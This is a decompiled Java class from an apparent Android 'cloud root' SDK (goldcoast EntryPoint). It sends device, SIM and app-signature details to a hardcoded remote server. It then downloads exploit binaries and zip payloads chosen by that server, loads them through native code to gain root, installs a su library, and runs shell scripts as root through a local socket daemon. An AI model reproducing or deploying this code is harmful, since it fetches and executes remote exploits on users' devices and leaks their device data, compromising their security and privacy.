package com.goldcoast.sdk.domain;

import android.annotation.TargetApi;
import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.ConditionVariable;
import android.os.Process;
import android.support.v4.app.FrameMetricsAggregator;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.util.Pair;
import com.cyjh.common.p067b.InterfaceC1133a;
import com.goldcoast.sdk.p127a.C1769b;
import com.goldcoast.sdk.p127a.C1771d;
import com.goldcoast.sdk.p127a.C1773f;
import com.goldcoast.sdk.p127a.C1774g;
import com.goldcoast.sdk.p128b.C1775a;
import com.goldcoast.sdk.p128b.C1776b;
import com.goldcoast.sdk.p129c.C1777a;
import com.goldcoast.sdk.p129c.C1779c;
import com.goldcoast.sdk.p129c.C1780d;
import com.goldcoast.sdk.p129c.C1781e;
import com.goldcoast.sdk.p129c.C1783g;
import com.goldcoast.sdk.p129c.C1784h;
import com.king.sdk.C2361i;
import com.king.sdk.IDFEE16B42C8B2890D8FF2860AF5562B1;
import com.king.sdk.KingListener;
import com.p021b.p022a.C0736ai;
import com.p021b.p022a.C0743ap;
import com.p021b.p022a.C0774x;
import com.p021b.p022a.C0775y;
import com.umeng.commonsdk.proguard.C2518v;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateEncodingException;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* loaded from: classes.dex */
public class EntryPoint {
    public static final byte RS_LONG = 1;
    public static final byte RS_MIXED = 2;
    public static final byte RS_TEMP = 0;
    public static final byte S_120 = 3;
    public static final byte S_123 = 2;
    public static final byte S_43 = 1;
    public static final byte S_47 = 4;

    /* renamed from: a */
    private static EntryPoint f7025a = null;

    /* renamed from: b */
    private static byte f7026b = 1;

    /* renamed from: c */
    private static String f7027c = null;

    /* renamed from: d */
    private static String f7028d = null;

    /* renamed from: e */
    private static String f7029e = null;
    public static File extractDir = null;

    /* renamed from: f */
    private static String f7030f = null;

    /* renamed from: g */
    private static C0736ai f7031g = new C0736ai();

    /* renamed from: h */
    private static AnalyseResult f7032h = null;

    /* renamed from: i */
    private static String f7033i = null;

    /* renamed from: j */
    private static int f7034j = 60;

    /* renamed from: k */
    private static int f7035k = -1;

    /* renamed from: l */
    private static byte f7036l = 0;

    /* renamed from: m */
    private static boolean f7037m = true;
    protected static Application mContext;

    /* renamed from: n */
    private static final boolean f7038n;

    /* renamed from: A */
    private C1771d f7039A;

    /* renamed from: B */
    private C1771d f7040B;

    /* renamed from: F */
    private Pair<String, String> f7044F;

    /* renamed from: r */
    private int f7048r;

    /* renamed from: s */
    private int f7049s;

    /* renamed from: t */
    private int f7050t;

    /* renamed from: u */
    private int f7051u;

    /* renamed from: v */
    private ConnectivityManager f7052v;

    /* renamed from: w */
    private JNIWrapper f7053w;

    /* renamed from: x */
    private String f7054x;

    /* renamed from: z */
    private C1779c f7056z;

    /* renamed from: o */
    private final String[] f7045o = {"天", "干", "地", "支", "山"};

    /* renamed from: p */
    private final KingListener f7046p = new BinderC1786a(this);

    /* renamed from: q */
    private boolean f7047q = false;

    /* renamed from: y */
    private boolean f7055y = false;

    /* renamed from: C */
    private boolean f7041C = false;

    /* renamed from: D */
    private boolean f7042D = false;

    /* renamed from: E */
    private BroadcastReceiver f7043E = new C1788c(this);

    static {
        f7038n = Build.VERSION.SDK_INT >= 14;
        try {
            System.loadLibrary("goldcoast");
        } catch (Exception e) {
            f7037m = false;
            e.printStackTrace();
        }
    }

    private EntryPoint() {
        C1784h.m8124a();
        C1784h.m8127a("client", f7033i);
        if (f7037m) {
            this.f7053w = new JNIWrapper();
        }
        extractDir = new File(mContext.getFilesDir().getAbsoluteFile() + File.separator + "ota" + File.separator + "elf");
        try {
            mContext.unregisterReceiver(this.f7043E);
        } catch (Exception unused) {
        }
        this.f7052v = (ConnectivityManager) mContext.getSystemService("connectivity");
        mContext.registerReceiver(this.f7043E, new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"));
        C1783g.m8121a(mContext);
        this.f7056z = C1779c.m8102a(mContext);
        initHost("http://www.newbyvideo.com:10001");
        C1776b.m8095a(f7027c);
    }

    /* renamed from: a */
    private int m8130a(C1771d c1771d) {
        m8152b(String.format("key:%s\norder:%d name: %s", c1771d.m8070e(), Integer.valueOf(c1771d.m8069d()), c1771d.m8064a()), 2);
        try {
            if (this.f7053w == null) {
                return -1;
            }
            return this.f7053w.loadSO(String.format("%s/ota/elf/%s", mContext.getFilesDir(), c1771d.m8064a()));
        } catch (Exception e) {
            e.printStackTrace();
            return -1;
        }
    }

    /* renamed from: a */
    private static String m8133a(InputStream inputStream, String str) {
        ZipInputStream zipInputStream = new ZipInputStream(inputStream);
        String str2 = "";
        zipInputStream.available();
        String str3 = "";
        int i = 0;
        while (true) {
            ZipEntry nextEntry = zipInputStream.getNextEntry();
            if (nextEntry == null) {
                break;
            }
            if (!str2.startsWith("META-INF") && !nextEntry.isDirectory()) {
                if (nextEntry.getName().startsWith("_")) {
                    str3 = nextEntry.getName();
                }
                i++;
                str2 = nextEntry.getName();
                File file = new File(str, str2);
                file.delete();
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                m8140a(zipInputStream, fileOutputStream);
                fileOutputStream.close();
                C1781e.m8113a(file);
            }
        }
        zipInputStream.close();
        return i > 1 ? str3 : str2;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: a */
    public static /* synthetic */ String m8134a(String str, int i) {
        if (i != 2 && i != 3) {
            return extractDir.getAbsolutePath() + File.separator + str;
        }
        String str2 = extractDir.getAbsolutePath() + File.separator + str;
        String str3 = extractDir.getParent() + File.separator + ".romaster_root";
        File file = new File(str2);
        C1781e.m8116a(file, new File(str3));
        C1781e.m8114a(str3, 493);
        file.delete();
        return extractDir.getParent() + File.separator + "shua .romaster_root";
    }

    /* renamed from: a */
    private static String m8135a(byte[] bArr) {
        StringBuilder sb = new StringBuilder(bArr.length * 2);
        for (int i = 0; i < bArr.length; i++) {
            String hexString = Integer.toHexString(bArr[i]);
            int length = hexString.length();
            if (length == 1) {
                hexString = "0" + hexString;
            }
            if (length > 2) {
                hexString = hexString.substring(length - 2, length);
            }
            sb.append(hexString.toUpperCase());
            if (i < bArr.length - 1) {
                sb.append(':');
            }
        }
        return sb.toString();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: a */
    public static /* synthetic */ void m8136a(int i) {
        try {
            C1784h.m8124a();
            String m8125a = C1784h.m8125a("refer");
            if (TextUtils.isEmpty(m8125a)) {
                return;
            }
            JSONArray jSONArray = new JSONArray(m8125a);
            JSONArray jSONArray2 = new JSONArray();
            for (int i2 = 0; i2 < jSONArray.length(); i2++) {
                if (i2 != i) {
                    jSONArray2.put(jSONArray.get(i2).toString());
                }
            }
            C1784h.m8124a();
            C1784h.m8127a("refer", jSONArray2.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: a */
    public static /* synthetic */ void m8137a(EntryPoint entryPoint, String str) {
        String str2;
        String optString = new JSONObject(str).optString("body", "");
        int i = 1;
        if (TextUtils.isEmpty(optString)) {
            if (entryPoint.f7048r == 4) {
                entryPoint.m8152b("response body is null\n$$$ failed", 1);
                return;
            } else {
                entryPoint.m8152b("response body is null", 2);
                return;
            }
        }
        StringBuilder sb = new StringBuilder();
        sb.append("######\n");
        char c2 = 0;
        sb.append(String.format("<analyseP.Enc>:%s\n", str));
        C1783g.m8120a();
        C1783g.m8123b(sb.toString());
        JSONObject jSONObject = new JSONObject(C1777a.m8097b(optString));
        JSONArray optJSONArray = jSONObject.optJSONArray("bra");
        entryPoint.f7050t = optJSONArray.length();
        String optString2 = jSONObject.optString("global", "");
        int optInt = jSONObject.optInt("category", 0);
        String optString3 = jSONObject.optString("token", "");
        if (!TextUtils.isEmpty(optString3)) {
            C1784h.m8124a();
            C1784h.m8127a("client", optString3);
        }
        entryPoint.m8155c(optString2);
        String optString4 = jSONObject.optString("poc", "");
        ArrayList arrayList = new ArrayList();
        if (optJSONArray == null || optJSONArray.length() <= 0) {
            if (entryPoint.f7048r == 4) {
                entryPoint.m8152b("not found suitable su file\n$$$ failed ", 1);
                return;
            } else {
                entryPoint.m8152b("not found suitable su file ", 2);
                return;
            }
        }
        int i2 = 0;
        while (i2 < optJSONArray.length()) {
            if (entryPoint.f7041C) {
                return;
            }
            entryPoint.f7051u = i2;
            JSONObject jSONObject2 = optJSONArray.getJSONObject(i2);
            String optString5 = jSONObject2.optString("file");
            entryPoint.f7054x = jSONObject2.optString("params");
            int optInt2 = jSONObject2.optInt("category");
            int optInt3 = jSONObject2.optInt("order");
            String optString6 = jSONObject2.optString("file_hex", "");
            String optString7 = jSONObject2.optString("component", "");
            String str3 = optString5.split("\\?")[c2];
            String substring = str3.substring(str3.lastIndexOf("/") + i, str3.length());
            C1771d c1771d = new C1771d(substring, optInt2, optString4, optInt3, optString6, optString5);
            if (entryPoint.f7047q) {
                return;
            }
            if ((optInt == 0 && !TextUtils.isEmpty(optString7) && !optString7.equals("null") && !optString7.equals("[]")) || (i2 == 0 && !optString7.equals("null") && !optString7.equals("[]"))) {
                m8151b(optString7);
            }
            C1775a.m8094a(optString5, mContext, substring);
            arrayList.add(substring);
            int length = optJSONArray.length();
            if (TextUtils.isEmpty(c1771d.m8066b())) {
                str2 = "poc is null";
            } else {
                if (c1771d.m8064a().endsWith(".zip")) {
                    String str4 = extractDir.getAbsolutePath() + File.separator + c1771d.m8064a();
                    c1771d.m8065a(m8133a(new FileInputStream(str4), extractDir.getAbsolutePath()));
                    new File(str4).delete();
                }
                if (f7035k != 0) {
                    entryPoint.f7039A = c1771d;
                    if (entryPoint.f7056z.m8106c(c1771d.m8064a())) {
                        str2 = "$$$ skip";
                    } else {
                        if (entryPoint.f7048r != 4) {
                            entryPoint.m8147b(c1771d);
                        } else if (entryPoint.f7053w != null) {
                            if (entryPoint.m8130a(c1771d) != 3000) {
                                if (i2 == length - 1) {
                                    entryPoint.m8152b("$$$ failed", 1);
                                    entryPoint.braFlush();
                                } else {
                                    str2 = "$$$ return null";
                                }
                            }
                        }
                        i2++;
                        i = 1;
                        c2 = 0;
                    }
                }
                entryPoint.m8159e();
                i2++;
                i = 1;
                c2 = 0;
            }
            entryPoint.m8152b(str2, 2);
            i2++;
            i = 1;
            c2 = 0;
        }
        entryPoint.braFlush();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: a */
    public static /* synthetic */ void m8139a(EntryPoint entryPoint, String str, List list) {
        String optString = new JSONObject(str).optString("body", "");
        if (TextUtils.isEmpty(optString)) {
            entryPoint.m8152b("response body is null", 2);
            return;
        }
        C1783g.m8120a();
        C1783g.m8123b("######\n" + String.format("<analyseP.Enc>:%s\n", str));
        JSONObject jSONObject = new JSONObject(C1777a.m8097b(optString));
        JSONArray optJSONArray = jSONObject.optJSONArray("bra");
        entryPoint.f7050t = optJSONArray.length();
        String optString2 = jSONObject.optString("global", "");
        int optInt = jSONObject.optInt("category", 0);
        String optString3 = jSONObject.optString("token", "");
        if (!TextUtils.isEmpty(optString3)) {
            C1784h.m8124a();
            C1784h.m8127a("client", optString3);
        }
        entryPoint.m8155c(optString2);
        String optString4 = jSONObject.optString("poc", "");
        new ArrayList();
        if (optJSONArray == null || optJSONArray.length() <= 0) {
            if (entryPoint.f7048r == 4) {
                entryPoint.m8152b("not found suitable su file\n$$$ failed", 1);
                return;
            } else {
                entryPoint.m8152b("not found suitable su file ", 2);
                return;
            }
        }
        for (int i = 0; i < optJSONArray.length() && !entryPoint.f7041C; i++) {
            entryPoint.f7051u = i;
            JSONObject jSONObject2 = optJSONArray.getJSONObject(i);
            String optString5 = jSONObject2.optString("file");
            entryPoint.f7054x = jSONObject2.optString("params");
            int optInt2 = jSONObject2.optInt("category");
            int optInt3 = jSONObject2.optInt("order");
            String optString6 = jSONObject2.optString("file_hex", "");
            String optString7 = jSONObject2.optString("component", "");
            String str2 = optString5.split("\\?")[0];
            C1783g.m8120a();
            C1783g.m8122a("parseResponse_m->braUrl=" + str2);
            C1771d c1771d = new C1771d(optString5.substring(str2.lastIndexOf("/") + 1, str2.length()), optInt2, optString4, optInt3, optString6, optString5);
            if (entryPoint.f7047q) {
                return;
            }
            if ((optInt == 0 && !TextUtils.isEmpty(optString7) && !optString7.equals("null") && !optString7.equals("[]")) || (i == 0 && !optString7.equals("null") && !optString7.equals("[]"))) {
                m8151b(optString7);
            }
            list.add(c1771d);
        }
    }

    /* renamed from: a */
    private static void m8140a(InputStream inputStream, OutputStream outputStream) {
        byte[] bArr = new byte[4096];
        while (true) {
            int read = inputStream.read(bArr);
            if (read <= 0) {
                return;
            } else {
                outputStream.write(bArr, 0, read);
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: a */
    public static /* synthetic */ void m8141a(String str) {
        try {
            C1784h.m8124a();
            String m8125a = C1784h.m8125a("refer");
            JSONArray jSONArray = TextUtils.isEmpty(m8125a) ? new JSONArray() : new JSONArray(m8125a);
            jSONArray.put(str);
            C1784h.m8124a();
            C1784h.m8127a("refer", jSONArray.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: a */
    public void m8142a(String str, int i, int i2) {
        C0774x m1999a = new C0775y().m2000a("body", str).m1999a();
        StringBuilder sb = new StringBuilder();
        sb.append(i2 == 2 ? "######rePost\n" : "######\n");
        sb.append(String.format("<feedbackQ.Enc>:%s\n", m1999a.toString()));
        C1783g.m8120a();
        C1783g.m8123b(sb.toString());
        ConditionVariable conditionVariable = new ConditionVariable(false);
        conditionVariable.close();
        f7031g.m1868a(new C0743ap().m1906a(f7029e).m1905a(m1999a).m1902a()).mo1890a(new C1793h(this, i2, str, conditionVariable, i));
        conditionVariable.block();
    }

    @TargetApi(3)
    /* renamed from: a */
    private void m8143a(String str, int i, String str2, int i2) {
        File file = new File(extractDir.getAbsolutePath(), str);
        C1774g c1774g = new C1774g();
        C1773f c1773f = new C1773f(C1773f.m8075a());
        C1780d.m8108a(mContext);
        c1773f.m8076a(C1780d.m8107a().m8057b().m8073b());
        c1774g.m8081a(c1773f);
        c1774g.m8082a(str);
        c1774g.m8079a(i);
        c1774g.m8084b(str2);
        c1774g.m8080a(System.currentTimeMillis());
        C1780d.m8108a(mContext);
        c1774g.m8085c(C1780d.m8109b());
        try {
            TelephonyManager telephonyManager = (TelephonyManager) mContext.getSystemService("phone");
            c1774g.m8086d(telephonyManager.getNetworkOperatorName());
            c1774g.m8087e(telephonyManager.getSimOperatorName());
        } catch (Exception unused) {
        }
        c1774g.m8088f(Locale.getDefault().getDisplayLanguage());
        c1774g.m8089g(Locale.getDefault().getDisplayCountry());
        C1784h.m8124a();
        c1774g.m8090h(C1784h.m8125a("client"));
        c1774g.m8092j(mContext.getPackageName());
        c1774g.m8093k(getCertificateFingerprintMD5());
        c1774g.m8083b(i2);
        c1774g.m8091i("4.0.14");
        file.delete();
        try {
            m8142a(C1777a.m8096a(c1774g.m8078a().toString()), -1, 1);
        } catch (Exception unused2) {
        }
    }

    /* renamed from: a */
    private boolean m8144a(AnalyseResult analyseResult) {
        boolean z;
        String str;
        NetworkInfo[] allNetworkInfo;
        ConnectivityManager connectivityManager = (ConnectivityManager) mContext.getSystemService("connectivity");
        if (connectivityManager != null && (allNetworkInfo = connectivityManager.getAllNetworkInfo()) != null) {
            for (NetworkInfo networkInfo : allNetworkInfo) {
                if (networkInfo.getState() == NetworkInfo.State.CONNECTED) {
                    z = true;
                    break;
                }
            }
        }
        z = false;
        if (z) {
            C1784h.m8124a();
            if (TextUtils.isEmpty(C1784h.m8125a("client")) || mContext == null) {
                str = "start failed: 请在Application中调用 EntryPoint.init([context],[token])";
            } else {
                if (analyseResult != null) {
                    return true;
                }
                str = "start failed: 请初始化analyseResult参数";
            }
        } else {
            str = "start failed: 当前网络连接异常，请检测网络连接是否可用.";
        }
        m8152b(str, 1);
        return false;
    }

    /* renamed from: a */
    private static boolean m8146a(File file) {
        try {
            LocalSocket localSocket = new LocalSocket();
            localSocket.connect(new LocalSocketAddress("darwin.rodo", LocalSocketAddress.Namespace.ABSTRACT));
            byte[] bytes = file.getAbsolutePath().getBytes();
            ByteBuffer allocate = ByteBuffer.allocate(bytes.length + 4);
            allocate.order(ByteOrder.LITTLE_ENDIAN);
            allocate.putInt(bytes.length);
            allocate.put(bytes);
            localSocket.getOutputStream().write(allocate.array());
            byte[] bytes2 = String.valueOf(Process.myPid()).getBytes();
            Log.d("KingDaemon", "client pid=" + Process.myPid());
            ByteBuffer allocate2 = ByteBuffer.allocate(bytes2.length + 4);
            allocate2.order(ByteOrder.LITTLE_ENDIAN);
            allocate2.putInt(bytes2.length);
            allocate2.put(bytes2);
            localSocket.getOutputStream().write(allocate2.array());
            localSocket.close();
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    @TargetApi(5)
    /* renamed from: b */
    private Pair<String, String> m8147b(C1771d c1771d) {
        if (f7035k == 0) {
            return new Pair<>("yes", "$$$ success");
        }
        ConditionVariable conditionVariable = new ConditionVariable(false);
        conditionVariable.close();
        C1779c c1779c = this.f7056z;
        String m8064a = c1771d.m8064a();
        if (!c1779c.m8106c(m8064a)) {
            String m8103a = c1779c.m8103a();
            JSONArray jSONArray = null;
            if (TextUtils.isEmpty(m8103a)) {
                jSONArray = new JSONArray();
            } else {
                try {
                    jSONArray = new JSONArray(m8103a);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            try {
                jSONArray.put(m8064a);
                c1779c.m8104a(jSONArray.toString());
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        new Thread(new RunnableC1795j(this, c1771d)).start();
        new Thread(new RunnableC1787b(this, conditionVariable)).start();
        conditionVariable.block();
        this.f7056z.m8105b(c1771d.m8064a());
        if (this.f7044F == null) {
            this.f7044F = new Pair<>("no", "not return any result");
        }
        return this.f7044F;
    }

    /* renamed from: b */
    private void m8148b() {
        File file = new File(extractDir.getParent());
        if (file.listFiles() != null) {
            try {
                for (File file2 : file.listFiles()) {
                    file2.delete();
                }
            } catch (Exception unused) {
            }
        }
        extractDir.mkdirs();
        this.f7055y = false;
    }

    /* renamed from: b */
    private static void m8151b(String str) {
        String str2 = str.split("\\?")[0];
        String substring = str2.substring(str2.lastIndexOf("/") + 1, str2.length());
        C1775a.m8094a(str, mContext, str2);
        String str3 = extractDir.getAbsolutePath() + File.separator + substring;
        m8133a(new FileInputStream(str3), extractDir.getAbsolutePath());
        new File(str3).delete();
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: b */
    public void m8152b(String str, int i) {
        f7035k = i;
        if (i == 0) {
            if (TextUtils.isEmpty(str)) {
                return;
            }
            if (this.f7040B == null || !this.f7040B.m8064a().equals(this.f7039A.m8064a())) {
                this.f7040B = this.f7039A;
                this.f7056z.m8104a("");
                if (this.f7039A != null) {
                    m8143a(this.f7039A.m8064a(), 1, str, this.f7039A.m8068c());
                }
                for (int i2 = 0; i2 < 30; i2++) {
                    try {
                        if (getStatus()) {
                            break;
                        }
                        Thread.sleep(1000L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                f7032h.onSuccess(str);
                return;
            }
            return;
        }
        if (i == 1) {
            f7032h.onFailed(str);
            braFlush();
            if (this.f7039A != null) {
                m8143a(this.f7039A.m8064a(), -1, str, this.f7039A.m8068c());
                return;
            }
            return;
        }
        if (i == 2) {
            f7032h.onProgress(str);
            return;
        }
        if (this.f7048r != 4 || this.f7050t - 1 != this.f7051u) {
            f7032h.onException(str);
            return;
        }
        f7032h.onFailed(str);
        braFlush();
        if (this.f7039A != null) {
            m8143a(this.f7039A.m8064a(), -1, str, this.f7039A.m8068c());
        }
    }

    /* renamed from: c */
    private void m8153c() {
        File file = new File(mContext.getFilesDir().getAbsolutePath() + File.separator + "dump");
        if (file.exists()) {
            file.delete();
        }
        this.f7047q = false;
        this.f7049s = 0;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: c */
    public static /* synthetic */ void m8154c(EntryPoint entryPoint) {
        if (TextUtils.isEmpty(entryPoint.f7056z.m8103a())) {
            return;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("rf_md5", entryPoint.f7056z.m8103a());
            C1780d.m8108a(mContext);
            jSONObject.put(InterfaceC1133a.f3938aM, C1780d.m8109b());
            C1784h.m8124a();
            jSONObject.put("token", C1784h.m8125a("client"));
            jSONObject.put(C2518v.f9564j, mContext.getPackageName());
            jSONObject.put("signature", entryPoint.getCertificateFingerprintMD5());
            f7031g.m1868a(new C0743ap().m1906a(f7030f).m1905a(new C0775y().m2000a("body", C1777a.m8096a(jSONObject.toString())).m1999a()).m1902a()).mo1889a();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* renamed from: c */
    private void m8155c(String str) {
        if (this.f7055y) {
            return;
        }
        String str2 = str.split("\\?")[0];
        String substring = str2.substring(str2.lastIndexOf("/") + 1, str2.length());
        String str3 = extractDir.getAbsolutePath() + File.separator + substring;
        C1775a.m8094a(str, mContext, substring);
        m8133a(new FileInputStream(str3), extractDir.getParent());
        new File(str3).delete();
        String format = String.format("%s%slibsu.so", extractDir.getParent(), File.separator);
        File file = new File(mContext.getFilesDir().getAbsolutePath() + File.separator + "permmgr" + File.separator + "libsu.so");
        if (!file.exists()) {
            file.mkdirs();
        }
        File file2 = new File(format);
        C1781e.m8116a(file2, file);
        C1781e.m8113a(file);
        file2.delete();
        this.f7055y = true;
    }

    /* renamed from: d */
    private JSONObject m8157d() {
        C1780d.m8108a(mContext);
        C1769b m8107a = C1780d.m8107a();
        JSONObject jSONObject = new JSONObject();
        C1773f c1773f = new C1773f(C1773f.m8075a());
        C1780d.m8108a(mContext);
        c1773f.m8076a(C1780d.m8110c().m8073b());
        m8107a.m8055a(c1773f);
        jSONObject.put("device", m8107a.m8052a());
        jSONObject.put("self", mContext.getPackageName());
        C1784h.m8124a();
        jSONObject.put("token", C1784h.m8125a("client"));
        jSONObject.put(C2518v.f9564j, mContext.getPackageName());
        jSONObject.put("signature", getCertificateFingerprintMD5());
        jSONObject.put("keyword", "");
        return jSONObject;
    }

    /* renamed from: e */
    private void m8159e() {
        m8152b("$$$ success", 0);
        this.f7047q = true;
        braFlush();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: f */
    public static /* synthetic */ int m8160f(EntryPoint entryPoint) {
        int i = entryPoint.f7049s;
        entryPoint.f7049s = i + 1;
        return i;
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: f */
    public void m8161f() {
        new Thread(new RunnableC1794i(this)).start();
    }

    /* renamed from: g */
    private static boolean m8163g() {
        try {
            LocalSocket localSocket = new LocalSocket();
            localSocket.connect(new LocalSocketAddress("darwin.rodo", LocalSocketAddress.Namespace.ABSTRACT));
            localSocket.close();
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: h */
    public static /* synthetic */ boolean m8164h(EntryPoint entryPoint) {
        entryPoint.f7041C = false;
        return false;
    }

    public static void init(Application application, String str, AnalyseResult analyseResult, int i, byte b2) {
        mContext = application;
        f7032h = analyseResult;
        C1784h.m8126a(mContext);
        f7033i = str;
        f7026b = b2;
        if (i >= 120) {
            f7034j = i;
        }
    }

    public static EntryPoint instance() {
        if (f7025a == null) {
            f7025a = new EntryPoint();
        }
        return f7025a;
    }

    public synchronized void analyse(AnalyseResult analyseResult) {
        f7035k = -1;
        f7032h = analyseResult;
        if (m8144a(f7032h)) {
            if (getStatus()) {
                m8159e();
                return;
            }
            if (f7035k == 0) {
                m8159e();
                return;
            }
            if (this.f7041C) {
                m8152b("busying now\n$$$ failed", 1);
                return;
            }
            m8148b();
            m8153c();
            m8161f();
            JSONObject m8157d = m8157d();
            for (int i = 0; i < this.f7045o.length; i++) {
                if (i != 3) {
                    this.f7048r = i;
                    if (this.f7047q) {
                        return;
                    }
                    braFlush();
                    if (this.f7041C) {
                        break;
                    }
                    new Thread(new RunnableC1789d(this)).start();
                    if (f7035k != 0) {
                        ConditionVariable conditionVariable = new ConditionVariable(false);
                        m8152b(String.format("正在云端  [%s]  字组查找方案 请等待...", this.f7045o[i]), 2);
                        m8157d.put("category", i);
                        m8157d.put("sdkV", "4.0.14");
                        m8157d.put("rtp", (int) f7026b);
                        C0774x m1999a = new C0775y().m2000a("body", C1777a.m8096a(m8157d.toString())).m1999a();
                        C1783g.m8120a();
                        C1783g.m8123b("######\n" + String.format("<analyseQ.Enc>:%s\n", m1999a.toString()));
                        conditionVariable.close();
                        f7031g.m1868a(new C0743ap().m1906a(f7028d).m1905a(m1999a).m1902a()).mo1890a(new C1790e(this, conditionVariable, new boolean[]{false}));
                        conditionVariable.block();
                    }
                }
            }
        }
    }

    public void braFlush() {
        if (extractDir == null || extractDir.listFiles() == null) {
            return;
        }
        try {
            for (File file : extractDir.listFiles()) {
                file.delete();
            }
        } catch (Exception unused) {
        }
    }

    public void cleanSkipFlag() {
        this.f7056z.m8104a("");
    }

    public boolean exec(String[] strArr) {
        String str;
        String str2;
        if (!getStatus()) {
            str = "EntryPoint";
            str2 = "getStatus failed, Service not start";
        } else {
            if (f7036l == 0) {
                execDarwin(strArr);
                return true;
            }
            if (f7036l == 1) {
                try {
                    C2361i m10352a = C2361i.m10352a(mContext);
                    int myPid = Process.myPid();
                    String packageName = mContext.getPackageName();
                    C1784h.m8124a();
                    m10352a.m10355a(strArr, myPid, packageName, C1784h.m8125a("client"));
                    return true;
                } catch (Exception e) {
                    e.printStackTrace();
                    return true;
                }
            }
            str = "EntryPoint";
            str2 = "Service has been stoped";
        }
        Log.d(str, str2);
        return false;
    }

    public void execDarwin(String[] strArr) {
        if (strArr == null || strArr.length <= 0) {
            return;
        }
        File file = new File(mContext.getFilesDir(), "tmp.sh");
        if (!file.exists()) {
            try {
                file.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        C1781e.m8115a(strArr, file);
        C1781e.m8114a(file.getAbsolutePath(), (int) FrameMetricsAggregator.EVERY_DURATION);
        m8146a(file);
    }

    public void getBra(C1771d c1771d) {
        C1775a.m8094a(c1771d.m8071f(), mContext, c1771d.m8064a());
        if (TextUtils.isEmpty(c1771d.m8066b())) {
            m8152b("poc is null", 2);
        } else if (c1771d.m8064a().endsWith(".zip")) {
            String str = extractDir.getAbsolutePath() + File.separator + c1771d.m8064a();
            c1771d.m8065a(m8133a(new FileInputStream(str), extractDir.getAbsolutePath()));
            new File(str).delete();
        }
        this.f7039A = c1771d;
        if (this.f7056z.m8106c(c1771d.m8064a())) {
            m8152b("$$$ skip", 2);
            return;
        }
        if (this.f7048r != 4) {
            m8147b(c1771d);
        } else if (m8130a(c1771d) == 3000) {
            m8159e();
        } else {
            m8152b("$$$ failed", 1);
            braFlush();
        }
    }

    public String getCertificateFingerprintMD5() {
        PackageInfo packageInfo;
        CertificateFactory certificateFactory;
        X509Certificate x509Certificate;
        try {
            packageInfo = mContext.getPackageManager().getPackageInfo(mContext.getPackageName(), 64);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            packageInfo = null;
        }
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(packageInfo.signatures[0].toByteArray());
        try {
            certificateFactory = CertificateFactory.getInstance("X509");
        } catch (CertificateException e2) {
            e2.printStackTrace();
            certificateFactory = null;
        }
        try {
            x509Certificate = (X509Certificate) certificateFactory.generateCertificate(byteArrayInputStream);
        } catch (CertificateException e3) {
            e3.printStackTrace();
            x509Certificate = null;
        }
        try {
            return m8135a(MessageDigest.getInstance("MD5").digest(x509Certificate.getEncoded()));
        } catch (NoSuchAlgorithmException e4) {
            e4.printStackTrace();
            return null;
        } catch (CertificateEncodingException e5) {
            e5.printStackTrace();
            return null;
        }
    }

    public String getStackString(Throwable th) {
        StringWriter stringWriter = new StringWriter();
        PrintWriter printWriter = new PrintWriter(stringWriter);
        th.printStackTrace(printWriter);
        printWriter.close();
        return stringWriter.toString();
    }

    public boolean getStatus() {
        boolean m8163g = m8163g();
        f7036l = (byte) 0;
        return m8163g;
    }

    public boolean hasSkip() {
        return !TextUtils.isEmpty(this.f7056z.m8103a());
    }

    public void initHost(String str) {
        f7027c = str;
        f7028d = String.format("%s/api/v1/phones", f7027c);
        f7029e = String.format("%s/api/v1/phones/referer", f7027c);
        f7030f = String.format("%s/api/v1/where_is_the_way", f7027c);
    }

    public synchronized List<C1771d> manual(int i, AnalyseResult analyseResult) {
        if (!f7037m) {
            return null;
        }
        f7035k = -1;
        f7032h = null;
        f7032h = analyseResult;
        if (!m8144a(f7032h)) {
            return null;
        }
        if (f7035k == 0) {
            m8159e();
            return null;
        }
        if (this.f7041C) {
            m8152b("busying now\n$$$ failed", 1);
            return null;
        }
        m8148b();
        m8153c();
        m8161f();
        this.f7048r = i;
        JSONObject m8157d = m8157d();
